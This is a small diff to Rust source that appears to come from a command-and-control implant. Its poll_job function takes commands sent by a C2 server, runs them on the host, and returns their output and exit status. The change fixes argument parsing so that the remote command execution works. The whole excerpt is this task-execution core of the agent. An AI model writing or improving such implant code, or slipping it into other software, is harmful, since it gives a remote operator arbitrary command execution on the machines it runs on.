@@ -85,7 +85,11 @@ async fn poll_job() -> Result<()> {
             let mut res = c2::TaskResult::default();
             // let exe
             let cmd = execute.cmd;
-            let output = std::process::Command::new(cmd).output().unwrap();
+            let args: Vec<&str> = cmd.split_ascii_whitespace().collect();
+            let output = std::process::Command::new(args[0])
+                .args(&args[1..])
+                .output()
+                .unwrap();
             let output1 = String::from_utf8(output.stdout).unwrap();
             let data = Some(c2::task_result::Data::Execute(c2::ExecuteRes {
                 status: output.status.success(),
